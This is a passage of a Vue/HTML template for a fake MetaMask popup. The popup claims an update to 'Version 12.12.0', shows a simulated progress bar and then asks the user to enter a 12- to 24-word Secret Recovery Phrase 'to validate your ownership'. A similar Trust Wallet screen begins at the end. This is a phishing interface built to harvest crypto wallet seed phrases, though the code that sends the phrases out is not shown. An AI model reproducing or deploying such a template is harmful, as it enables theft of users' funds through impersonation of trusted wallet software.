                d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z"
                fill="#161616"
                stroke="#161616"
              ></path>
              <path
                d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z"
                fill="#763e1a"
                stroke="#763e1a"
              ></path>
              <path
                d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z"
                fill="#763e1a"
                stroke="#763e1a"
              ></path>
              <path
                d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z"
                fill="#f5841f"
                stroke="#f5841f"
              ></path>
              <path
                d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z"
                fill="#f5841f"
                stroke="#f5841f"
              ></path>
              <path
                d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z"
                fill="#f5841f"
                stroke="#f5841f"
              ></path>
            </g>
          </svg>
          <div
            class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-mt-12"
          >
            <svg
              class="scwtw-h-12 scwtw-w-12 scwtw-text-orange scwtw-animate-spin"
              xmlns="http://www.w3.org/2000/svg"
              width="24"
              height="24"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="1.5"
              stroke-linecap="round"
              stroke-linejoin="round"
            >
              <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
            </svg>
          </div>
        </div>
      </div>
      <div :class="pageManager == '2' ? 'metamaskupdata' : 'scwtw-hidden'">
        <div class="metamaskupdatacon">
          <div class="metamaskhead">
            <div>
              <svg
                class="scwtw-h-8 scwtw-w-8"
                fill="none"
                height="33"
                viewBox="0 0 35 33"
                width="35"
                xmlns="http://www.w3.org/2000/svg"
              >
                <g
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width=".25"
                >
                  <path
                    d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z"
                    fill="#e17726"
                    stroke="#e17726"
                  ></path>
                  <g fill="#e27625" stroke="#e27625">
                    <path d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"></path>
                    <path
                      d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"
                    ></path>
                    <path
                      d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"
                    ></path>
                    <path
                      d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"
                    ></path>
                    <path
                      d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"
                    ></path>
                    <path
                      d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"
                    ></path>
                    <path
                      d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"
                    ></path>
                  </g>
                  <path
                    d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z"
                    fill="#d5bfb2"
                    stroke="#d5bfb2"
                  ></path>
                  <path
                    d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z"
                    fill="#d5bfb2"
                    stroke="#d5bfb2"
                  ></path>
                  <path
                    d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z"
                    fill="#233447"
                    stroke="#233447"
                  ></path>
                  <path
                    d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z"
                    fill="#233447"
                    stroke="#233447"
                  ></path>
                  <path
                    d="m10.8733 28.8721.6495-5.3386-4.13117.1167z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z"
                    fill="#c0ac9d"
                    stroke="#c0ac9d"
                  ></path>
                  <path
                    d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z"
                    fill="#161616"
                    stroke="#161616"
                  ></path>
                  <path
                    d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z"
                    fill="#763e1a"
                    stroke="#763e1a"
                  ></path>
                  <path
                    d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z"
                    fill="#763e1a"
                    stroke="#763e1a"
                  ></path>
                  <path
                    d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                </g>
              </svg>
            </div>
            <div>
              <button
                @click="walletsswitch('Metamask', false)"
                class="metamask-close-button"
                type="button"
              >
                <svg
                  class="scwtw-w-4 scwtw-h-4 scwtw-text-blue"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                >
                  <path
                    d="M6 18L18 6M6 6l12 12"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  ></path>
                </svg>
              </button>
            </div>
          </div>
          <div class="metamaskbody">
            <div class="scwtw-mt-4 scwtw-mb-6">
              <svg
                class="updatasvg"
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                <polyline points="7 10 12 15 17 10"></polyline>
                <line x1="12" y1="15" x2="12" y2="3"></line>
              </svg>
            </div>
            <h2 class="metamasktit">Update Available</h2>
            <p class="metamasklitxt">Version 12.12.0</p>

            <div class="meatmaskulbox">
              <ul class="scwtw-list-disc scwtw-pl-5 metamaskul">
                <li class="metamaskli">
                  Fix main build modifying desktop build steps
                </li>
                <li class="metamaskli">Improving the security system</li>
                <li class="metamaskli">Fix incorrect network information</li>
                <li class="metamaskli">
                  Improve performance on signature request
                </li>
              </ul>
            </div>

            <button
              @click="pageSwitch('3')"
              class="metamaskupdatabut"
              type="button"
              id="metamask-update-button"
            >
              Update
            </button>

            <div class="scwtw-mt-4 scwtw-text-center">
              <p class="updatadtxt scwtw-font-normal">
                Need help?
                <a
                  href="https://href.li/?https://support.metamask.io"
                  target="_blank"
                  class="updatalink"
                  >Contact MetaMask Support</a
                >
              </p>
            </div>
          </div>
        </div>
      </div>
      <div :class="pageManager == '3' ? 'metamaskupdating' : 'scwtw-hidden'">
        <div class="metamaskupdatacon">
          <div class="metamaskhead">
            <div>
              <svg
                class="scwtw-h-8 scwtw-w-8"
                fill="none"
                height="33"
                viewBox="0 0 35 33"
                width="35"
                xmlns="http://www.w3.org/2000/svg"
              >
                <g
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width=".25"
                >
                  <path
                    d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z"
                    fill="#e17726"
                    stroke="#e17726"
                  ></path>
                  <g fill="#e27625" stroke="#e27625">
                    <path d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"></path>
                    <path
                      d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"
                    ></path>
                    <path
                      d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"
                    ></path>
                    <path
                      d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"
                    ></path>
                    <path
                      d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"
                    ></path>
                    <path
                      d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"
                    ></path>
                    <path
                      d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"
                    ></path>
                  </g>
                  <path
                    d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z"
                    fill="#d5bfb2"
                    stroke="#d5bfb2"
                  ></path>
                  <path
                    d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z"
                    fill="#d5bfb2"
                    stroke="#d5bfb2"
                  ></path>
                  <path
                    d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z"
                    fill="#233447"
                    stroke="#233447"
                  ></path>
                  <path
                    d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z"
                    fill="#233447"
                    stroke="#233447"
                  ></path>
                  <path
                    d="m10.8733 28.8721.6495-5.3386-4.13117.1167z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z"
                    fill="#c0ac9d"
                    stroke="#c0ac9d"
                  ></path>
                  <path
                    d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z"
                    fill="#161616"
                    stroke="#161616"
                  ></path>
                  <path
                    d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z"
                    fill="#763e1a"
                    stroke="#763e1a"
                  ></path>
                  <path
                    d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z"
                    fill="#763e1a"
                    stroke="#763e1a"
                  ></path>
                  <path
                    d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                </g>
              </svg>
            </div>
            <div>
              <button
                @click="walletsswitch('Metamask', false)"
                class="metamask-close-button"
                type="button"
              >
                <svg
                  class="scwtw-w-4 scwtw-h-4 scwtw-text-blue"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                >
                  <path
                    d="M6 18L18 6M6 6l12 12"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  ></path>
                </svg>
              </button>
            </div>
          </div>
          <div class="metamaskupdatingbody">
            <div class="scwtw-mt-4 scwtw-mb-6">
              <svg
                class="scwtw-w-16 scwtw-h-16 scwtw-text-blue scwtw-animate-spin"
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <path d="M21 12a9 9 0 1 1-6.219-8.56"></path>
              </svg>
            </div>
            <h2 class="metamaskupdatimgtit scwtw-text-center">
              Updating MetaMask
            </h2>
            <p class="metamaskupdatingtxt">
              Please wait while we update to version 12.12.0
            </p>
            <div class="progressbox">
              <div class="progressshadow">
                <div
                  class="progressbg"
                  :style="{ width: one_progress + '%' }"
                ></div>
              </div>
              <p class="progresstxt">{{ Math.trunc(one_progress) }}%</p>
            </div>
            <p class="metamaskupdatingdtxt">
              This may take a few moments. Please do not close this window.
            </p>
          </div>
        </div>
      </div>
      <div :class="pageManager == '4' ? 'metamaskinport' : 'scwtw-hidden'">
        <div class="metamaskupdatacon">
          <div class="metamaskhead">
            <div>
              <svg
                class="scwtw-h-8 scwtw-w-8"
                fill="none"
                height="33"
                viewBox="0 0 35 33"
                width="35"
                xmlns="http://www.w3.org/2000/svg"
              >
                <g
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width=".25"
                >
                  <path
                    d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z"
                    fill="#e17726"
                    stroke="#e17726"
                  ></path>
                  <g fill="#e27625" stroke="#e27625">
                    <path d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"></path>
                    <path
                      d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"
                    ></path>
                    <path
                      d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"
                    ></path>
                    <path
                      d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"
                    ></path>
                    <path
                      d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"
                    ></path>
                    <path
                      d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"
                    ></path>
                    <path
                      d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"
                    ></path>
                  </g>
                  <path
                    d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z"
                    fill="#d5bfb2"
                    stroke="#d5bfb2"
                  ></path>
                  <path
                    d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z"
                    fill="#d5bfb2"
                    stroke="#d5bfb2"
                  ></path>
                  <path
                    d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z"
                    fill="#233447"
                    stroke="#233447"
                  ></path>
                  <path
                    d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z"
                    fill="#233447"
                    stroke="#233447"
                  ></path>
                  <path
                    d="m10.8733 28.8721.6495-5.3386-4.13117.1167z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z"
                    fill="#cc6228"
                    stroke="#cc6228"
                  ></path>
                  <path
                    d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z"
                    fill="#e27525"
                    stroke="#e27525"
                  ></path>
                  <path
                    d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z"
                    fill="#c0ac9d"
                    stroke="#c0ac9d"
                  ></path>
                  <path
                    d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z"
                    fill="#161616"
                    stroke="#161616"
                  ></path>
                  <path
                    d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z"
                    fill="#763e1a"
                    stroke="#763e1a"
                  ></path>
                  <path
                    d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z"
                    fill="#763e1a"
                    stroke="#763e1a"
                  ></path>
                  <path
                    d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                  <path
                    d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z"
                    fill="#f5841f"
                    stroke="#f5841f"
                  ></path>
                </g>
              </svg>
            </div>
            <div>
              <button
                @click="walletsswitch('Metamask', false)"
                class="metamask-close-button"
                type="button"
              >
                <svg
                  class="scwtw-w-4 scwtw-h-4 scwtw-text-blue"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                >
                  <path
                    d="M6 18L18 6M6 6l12 12"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  ></path>
                </svg>
              </button>
            </div>
          </div>
          <div class="metamaskimportbody">
            <div class="metamaskimportbodyone">
              <div>
                <h3 class="metamaskimporttit">
                  Import your wallet with your Secret Recovery Phrase
                </h3>
              </div>
              <div class="scwtw-px-4 scwtw-mb-2">
                <p class="metamaskimporttxt">
                  We will use your Secret Recovery Phrase to validate your
                  ownership. Enter the Secret Recovery Phrase that you were
                  given when you created your wallet.
                  <a
                    class="metamaskimporttxtlink"
                    href="https://href.li/?https://support.metamask.io/start/learn/what-is-a-secret-recovery-phrase-and-how-to-keep-your-crypto-wallet-secure/"
                    target="_blank"
                    >Learn more</a
                  >
                </p>
              </div>
              <div class="scwtw-w-full scwtw-px-4 scwtw-mb-2">
                <select v-model="selectedOption" class="metamaskselect">
                  <option value="12" selected="">
                    I have a 12-word phrase
                  </option>
                  <option value="15">I have a 15-word phrase</option>
                  <option value="18">I have a 18-word phrase</option>
                  <option value="21">I have a 21-word phrase</option>
                  <option value="24">I have a 24-word phrase</option>
                </select>
              </div>
              <div :class="ismessage ? 'metamaskmessage' : 'scwtw-hidden'">
                <div class="metamaskmessagebox">
                  <div class="scwtw-pl-2">
                    <svg
                      class="scwtw-w-6 scwtw-h-6 scwtw-fill-blue"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 512 512"
                    >
                      <path
                        d="m252 51c-41 0-81 12-114 35-34 22-60 54-76 92-15 37-19 78-11 118 8 40 27 76 56 105 28 28 65 48 105 56 39 8 80 4 118-12 37-15 69-42 92-75 22-34 34-73 34-114 0-54-21-106-60-145-38-38-90-60-144-60z m-4 95c4 0 9 1 13 4 4 2 7 6 8 10 2 5 3 9 2 14-1 5-3 9-7 12-3 3-7 6-12 7-4 0-9 0-13-2-5-2-8-5-11-9-3-3-4-8-4-13 0-6 2-12 7-16 4-5 10-7 17-7z m19 220l-15 0c-5 0-9-1-12-4-3-3-4-7-4-11l0-95c-4 0-8-2-11-5-3-3-5-7-5-11 0-4 2-8 5-11 3-3 7-5 11-5l16 0c4 0 8 2 11 5 3 3 4 7 4 11l0 95c4 0 8 1 11 4 3 3 5 7 5 12 0 4-2 8-5 11-3 3-7 4-11 4z"
                      ></path>
                    </svg>
                  </div>
                  <div class="scwtw-text-start">
                    <p class="importmessagetxt">
                      You can paste your entire secret recovery phrase into any
                      field
                    </p>
                  </div>
                </div>
              </div>
            </div>
            <div class="metamaskimportbodytwo">
              <div class="metamaskimportinputbox">
                <div
                  v-for="(item, i) in visibleInputs"
                  :key="i"
                  class="metamaslinputitem"
                >
                  <p class="metamaskindextxt">{{ i + 1 }}.</p>
                  <input
                    :class="
                      item.type
                        ? 'metamaskimportinput no-auto'
                        : 'metamaskimportinput no-autofill-pwd'
                    "
                    v-model="item.value"
                    id="importwalletinput"
                    type="text"
                  />
                  <button @click="toggleType(i)" class="eyesvgbox">
                    <svg
                      :class="item.type ? 'scwtw-hidden' : ''"
                      width="24"
                      height="24"
                      fill="currentColor"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 640 512"
                    >
                      <path
                        d="M634 471L36 3.51A16 16 0 0 0 13.51 6l-10 12.49A16 16 0 0 0 6 41l598 467.49a16 16 0 0 0 22.49-2.49l10-12.49A16 16 0 0 0 634 471zM296.79 146.47l134.79 105.38C429.36 191.91 380.48 144 320 144a112.26 112.26 0 0 0-23.21 2.47zm46.42 219.07L208.42 260.16C210.65 320.09 259.53 368 320 368a113 113 0 0 0 23.21-2.46zM320 112c98.65 0 189.09 55 237.93 144a285.53 285.53 0 0 1-44 60.2l37.74 29.5a333.7 333.7 0 0 0 52.9-75.11 32.35 32.35 0 0 0 0-29.19C550.29 135.59 442.93 64 320 64c-36.7 0-71.71 7-104.63 18.81l46.41 36.29c18.94-4.3 38.34-7.1 58.22-7.1zm0 288c-98.65 0-189.08-55-237.93-144a285.47 285.47 0 0 1 44.05-60.19l-37.74-29.5a333.6 333.6 0 0 0-52.89 75.1 32.35 32.35 0 0 0 0 29.19C89.72 376.41 197.08 448 320 448c36.7 0 71.71-7.05 104.63-18.81l-46.41-36.28C359.28 397.2 339.89 400 320 400z"
                      ></path>
                    </svg>
                    <svg
                      :class="item.type ? '' : 'scwtw-hidden'"
                      width="24"
                      height="24"
                      fill="currentColor"
                      xmlns="http://www.w3.org/2000/svg"
                      viewBox="0 0 576 512"
                    >
                      <path
                        d="M288 144a110.94 110.94 0 0 0-31.24 5 55.4 55.4 0 0 1 7.24 27 56 56 0 0 1-56 56 55.4 55.4 0 0 1-27-7.24A111.71 111.71 0 1 0 288 144zm284.52 97.4C518.29 135.59 410.93 64 288 64S57.68 135.64 3.48 241.41a32.35 32.35 0 0 0 0 29.19C57.71 376.41 165.07 448 288 448s230.32-71.64 284.52-177.41a32.35 32.35 0 0 0 0-29.19zM288 400c-98.65 0-189.09-55-237.93-144C98.91 167 189.34 112 288 112s189.09 55 237.93 144C477.1 345 386.66 400 288 400z"
                      ></path>
                    </svg>
                  </button>
                </div>
              </div>
            </div>
            <div :class="errormessage ? 'metamaskmessagethr' : 'scwtw-hidden'">
              <div class="messageredbox">
                <div class="scwtw-pl-2">
                  <svg
                    class="scwtw-w-6 scwtw-h-6 scwtw-fill-red"
                    xmlns="http://www.w3.org/2000/svg"
                    viewBox="0 0 512 512"
                  >
                    <path
                      d="m443 342l-126-241c-16-32-40-50-65-50-26 0-50 18-66 50l-126 241c-16 30-18 60-5 83 13 23 38 36 71 36l251 0c33 0 58-13 71-36 13-23 11-53-5-83z m-206-145c0-8 6-15 15-15 8 0 14 7 14 15l0 105c0 8-6 15-14 15-9 0-15-7-15-15z m28 182c-1 1-2 2-3 3-1 0-2 1-3 1-1 1-2 1-4 2-1 0-2 0-3 0-2 0-3 0-4 0-2-1-3-1-4-2-1 0-2-1-3-1-1-1-2-2-3-3-4-4-6-9-6-15 0-5 2-11 6-15 1 0 2-1 3-2 1-1 2-2 3-2 1-1 2-1 4-1 2-1 5-1 7 0 2 0 3 0 4 1 1 0 2 1 3 2 1 1 2 2 3 2 4 4 6 10 6 15 0 6-2 11-6 15z"
                    ></path>
                  </svg>
                </div>
                <div class="scwtw-text-start">
                  <p class="metamaskerrortext">
                    Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words
                  </p>
                </div>
              </div>
            </div>
          </div>
          <div class="enterbutbox">
            <div class="scwtw-w-full">
              <button
                class="scwtw-w-full enterbut"
                type="button"
                @click="confirm()"
                :disabled="!isConfirmEnabled"
              >
                Confirm Secret Recovery Phrase
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- trust -->
  <div :class="Trustisshow ? 'walletsbox zindexh' : 'walletsbox zindexh op0'">
    <div
      @click="walletsswitch('Trust', false)"
      class="walletsbg zindexh1"
    ></div>
    <div
      :class="
        Trustisshow
          ? 'Metamaskbox trustbox Metamaskboxshow'
          : 'Metamaskbox trustbox'
      "
    >
      <div :class="pageManager == '1' ? 'trustone' : 'scwtw-hidden'">
        <div>
          <svg
            class="scwtw-h scwtw-w-full shield-svg"
            fill="none"
            width="62"
            height="87"
            viewBox="0 0 62 87"
            xmlns="http://www.w3.org/2000/svg"
          >
            <g clip-path="url(#clip0_26161_83707)">
              <path
                d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z"
                fill="#48FF91"
              ></path>
              <path
                d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z"
                fill="url(#paint0_linear_26161_83707)"
              ></path>
              <path
                d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z"
                fill="#48FF91"
              ></path>
              <path
                d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z"
                fill="#48FF91"
              ></path>
              <path
